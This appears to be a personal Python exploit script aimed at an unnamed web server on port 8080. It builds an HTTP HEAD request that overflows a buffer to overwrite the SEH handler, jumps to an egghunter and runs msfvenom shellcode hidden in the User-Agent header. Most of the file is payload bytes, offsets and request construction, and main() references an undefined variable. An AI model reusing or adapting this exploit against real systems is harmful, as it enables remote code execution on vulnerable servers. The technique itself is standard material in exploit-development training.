#!/usr/bin/python3

import socket
import struct
import subprocess

target_ip = "X.X.X.X"
target_port = 8080

def send_attack(crash_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(crash_string)

def gen_string(b_size):
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x0a\x0d\x20\x3f"
    buf =  b"w00tw00t"
    buf += b"\xd9\xc5\xd9\x74\x24\xf4\x58\x31\xc9\xbb\xb7\xed\x78"
    buf += b"\xbb\xb1\x30\x31\x58\x18\x83\xc0\x04\x03\x58\xa3\x0f"
    buf += b"\x8d\x47\x23\x4d\x6e\xb8\xb3\x32\xe6\x5d\x82\x72\x9c"
    buf += b"\x16\xb4\x42\xd6\x7b\x38\x28\xba\x6f\xcb\x5c\x13\x9f"
    buf += b"\x7c\xea\x45\xae\x7d\x47\xb5\xb1\xfd\x9a\xea\x11\x3c"
    buf += b"\x55\xff\x50\x79\x88\xf2\x01\xd2\xc6\xa1\xb5\x57\x92"
    buf += b"\x79\x3d\x2b\x32\xfa\xa2\xfb\x35\x2b\x75\x70\x6c\xeb"
    buf += b"\x77\x55\x04\xa2\x6f\xba\x21\x7c\x1b\x08\xdd\x7f\xcd"
    buf += b"\x41\x1e\xd3\x30\x6e\xed\x2d\x74\x48\x0e\x58\x8c\xab"
    buf += b"\xb3\x5b\x4b\xd6\x6f\xe9\x48\x70\xfb\x49\xb5\x81\x28"
    buf += b"\x0f\x3e\x8d\x85\x5b\x18\x91\x18\x8f\x12\xad\x91\x2e"
    buf += b"\xf5\x24\xe1\x14\xd1\x6d\xb1\x35\x40\xcb\x14\x49\x92"
    buf += b"\xb4\xc9\xef\xd8\x58\x1d\x82\x82\x36\xe0\x10\xb9\x74"
    buf += b"\xe2\x2a\xc2\x28\x8b\x1b\x49\xa7\xcc\xa3\x98\x8c\x23"
    buf += b"\xee\x81\xa4\xab\xb7\x53\xf5\xb1\x47\x8e\x39\xcc\xcb"
    buf += b"\x3b\xc1\x2b\xd3\x49\xc4\x70\x53\xa1\xb4\xe9\x36\xc5"
    buf += b"\x6b\x09\x13\xa6\xea\x99\xff\x29"
    # !mona egg
    egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # NSEH offset is 788
    # SEH offset 792
    # changing the length of the buffer changes SEH offset... wish I understood why that is
    # NSEH jumps back 41 bytes to the egghunter
    nseh = b"\xeb\xd7\x90\x90"
    # SEH is pop pop ret found at 0x00435994
    # since address has a null byte, null byte must be left out, null it appended when overwriting SEH at 792 bytes
    # other SEH offsets do not append a null byte
    seh = b"\x94\x59\x43"
    # Jumps back 41 bytes, executes egghunter, finds buf sent in user agent string, wins prizes
    pattern = b"\x90"*(788 - len(egghunter) -4) + egghunter + b"\x90"*4 + nseh + seh
    attack_string = (b"HEAD /" + pattern + b" HTTP/1.1\r\n"
    b"Host: " + target_ip.encode() + b":" + str(target_port).encode() + b"\r\n"
    b"User-Agent: " + buf + b"\r\n"
    b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    b"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
    b"Accept-Encoding: gzip,deflate\r\n"
    b"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
    b"Keep-Alive: 115\r\n"
    b"Connection: keep-alive\r\n\r\n")
    print(attack_string)
    return attack_string

def main():
    crash_string = gen_string(b_size)
    send_attack(crash_string)

if __name__ == "__main__":
    main()
